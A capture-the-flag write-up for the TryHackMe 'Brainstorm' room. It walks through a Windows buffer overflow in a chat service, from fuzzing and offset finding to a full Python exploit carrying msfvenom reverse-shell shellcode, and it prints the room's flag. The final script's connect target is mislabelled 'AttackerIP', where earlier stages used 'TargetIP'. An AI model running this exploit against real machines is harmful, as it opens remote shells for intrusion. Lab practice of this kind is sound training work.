###### Reverse engineer a chat program and write a script to exploit a Windows machine.
Room: https://tryhackme.com/room/brainstorm
##

**sudo nmap** -Pn -sS -sV -T5 -vv xx.xx.xx.xxx
```
PORT     STATE SERVICE    REASON          VERSION
21/tcp   open  ftp        syn-ack ttl 127 Microsoft ftpd
3389/tcp open  tcpwrapped syn-ack ttl 127
9999/tcp open  abyss?     syn-ack ttl 127
```
We assume that the app is running on port 9999.  
We can access the FTP anonymously.  

We can find the app's executable file and a dll required for it to run.  
Once we download these, we can set up a 32 bit windows VM to run the app.  
Note: use the **binary** mode to download the files from FTP. May get corrupted with ascii.  

By playing around a bit, we can see that we can crash the app by sending a long enough message.  
Using the following script, we can see that the app crashes at around ~2250-2500 bytes.   

```
#!/usr/bin/env python3

import socket, time, sys

name = "randomname"

timeout = 5
string = "A" * 250

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect(('TargetIP', 9999))
      s.send(bytes(name, "latin-1"))
      s.recv(1024)
      print("{} bytes".format(len(string)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print(" crashed @ {} bytes".format(len(string)))
    sys.exit(0)
  string += 250 * "A"
  time.sleep(1)
```

**msf-pattern_create -l 2400** and send the output as a message into the app.  
EIP register holds the value **31704330** at the moment of the crash.  

**msf-pattern_offset -l 2400 -q 31704330** returns 2012. That's the offset of the **31704330** sequence in our pattern.  
This means that we can control the Instruction Pointer, since we know that the next 4 bytes after the 2012nd byte will be written directly to EIP.  

**exploit.py - current stage**
```
import socket
import sys

username = b"abcdef"
msg = b"A" * 2012 + b"B"*4

try:
	print("sending ... ")
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('TargetIP',9999))
	s.recv(1024)
	s.recv(1024)
	s.send(username + b'\r\n')
	s.recv(1024)
	s.send(msg + b'\r\n')
	s.recv(1024)
	s.close()

except:
	print("a bubuit")
	sys.exit()

```
By running the exploit at the current stage, we can see that the EIP value is indeed 4 B's (or 42424242) in hex.  

Next, we need to find the bad characters in order to be able to exploit this.    
Use the following lines of code to generate a list of characters from x01 to xff.  
```
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

We can add them into our code in a variable called **badchars**.  
Then, at the last send, we send the badchars with the message.  

On the target machine, in Immunity Debugger, run the following command.  
> !mona bytearray -b "\x00"  

After running the script again, the app should crash as usual.  
However, we can compare our list of badchars with the bytearray generated by mona.  
> !mona compare -f path/to/bytearray.bin -a Addr_Of_ESP_when_app_crashed
  
In this case, we see that the output is **unmodified** which means that there are no bad chars.  
Let's find a jump instruction we can use to go to our payload.  (Make sure the app is crashed)

> !mona jmp -r esp -cpb "\x00"

Pick any address from the ones shown in the output.  
Update the **msg** variable in the exploit to concatenate the jump address written backwards (since it's little endian architecture).  
> msg = b"A" * 2012 + b"\xdf\x14\x50\x62"

Generate a payload using 
**msfvenom** -p windows/shell_reverse_tcp LHOST=AttackingIP LPORT=6666 EXITFUNC=thread -b "\x00" -f c

Create a variable called payload in the script and assign its value to the output of the payload created via msfvenom.  
Finally, add some NOPs (No Operation) to the message. "\x90" * 32 seems to be enough.

**final exploit.py**
```
import socket
import sys

username = b"randomname"
msg = b"A" * 2012 + b"\xdf\x14\x50\x62" + b"\x90" * 32
payload = (b"\xda\xce\xd9\x74\x24\xf4\x5e\xbf\x50\xf2\x6b\x80\x29\xc9\xb1"
b"\x52\x31\x7e\x17\x83\xee\xfc\x03\x2e\xe1\x89\x75\x32\xed\xcc"
b"\x76\xca\xee\xb0\xff\x2f\xdf\xf0\x64\x24\x70\xc1\xef\x68\x7d"
b"\xaa\xa2\x98\xf6\xde\x6a\xaf\xbf\x55\x4d\x9e\x40\xc5\xad\x81"
b"\xc2\x14\xe2\x61\xfa\xd6\xf7\x60\x3b\x0a\xf5\x30\x94\x40\xa8"
b"\xa4\x91\x1d\x71\x4f\xe9\xb0\xf1\xac\xba\xb3\xd0\x63\xb0\xed"
b"\xf2\x82\x15\x86\xba\x9c\x7a\xa3\x75\x17\x48\x5f\x84\xf1\x80"
b"\xa0\x2b\x3c\x2d\x53\x35\x79\x8a\x8c\x40\x73\xe8\x31\x53\x40"
b"\x92\xed\xd6\x52\x34\x65\x40\xbe\xc4\xaa\x17\x35\xca\x07\x53"
b"\x11\xcf\x96\xb0\x2a\xeb\x13\x37\xfc\x7d\x67\x1c\xd8\x26\x33"
b"\x3d\x79\x83\x92\x42\x99\x6c\x4a\xe7\xd2\x81\x9f\x9a\xb9\xcd"
b"\x6c\x97\x41\x0e\xfb\xa0\x32\x3c\xa4\x1a\xdc\x0c\x2d\x85\x1b"
b"\x72\x04\x71\xb3\x8d\xa7\x82\x9a\x49\xf3\xd2\xb4\x78\x7c\xb9"
b"\x44\x84\xa9\x6e\x14\x2a\x02\xcf\xc4\x8a\xf2\xa7\x0e\x05\x2c"
b"\xd7\x31\xcf\x45\x72\xc8\x98\x63\x8a\xd6\xb1\x1c\x8e\xd6\x5b"
b"\xd7\x07\x30\x31\xf7\x41\xeb\xae\x6e\xc8\x67\x4e\x6e\xc6\x02"
b"\x50\xe4\xe5\xf3\x1f\x0d\x83\xe7\xc8\xfd\xde\x55\x5e\x01\xf5"
b"\xf1\x3c\x90\x92\x01\x4a\x89\x0c\x56\x1b\x7f\x45\x32\xb1\x26"
b"\xff\x20\x48\xbe\x38\xe0\x97\x03\xc6\xe9\x5a\x3f\xec\xf9\xa2"
b"\xc0\xa8\xad\x7a\x97\x66\x1b\x3d\x41\xc9\xf5\x97\x3e\x83\x91"
b"\x6e\x0d\x14\xe7\x6e\x58\xe2\x07\xde\x35\xb3\x38\xef\xd1\x33"
b"\x41\x0d\x42\xbb\x98\x95\x62\x5e\x08\xe0\x0a\xc7\xd9\x49\x57"
b"\xf8\x34\x8d\x6e\x7b\xbc\x6e\x95\x63\xb5\x6b\xd1\x23\x26\x06"
b"\x4a\xc6\x48\xb5\x6b\xc3")
try:
	print("sending ... ")
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('AttackerIP',9999))
	s.recv(1024)
	s.recv(1024)
	s.send(username + b'\r\n')
	s.recv(1024)
	s.send(msg + payload + b'\r\n')
	s.recv(1024)
	s.close()

except:
	print("a bubuit")
	sys.exit()
```

Start a listener. Run the script.  
Get a reverse shell & the flag.  

Flag is in **root.txt**, 5b1001de5a44eca47eee71e7942a8f8a. **[1]**.  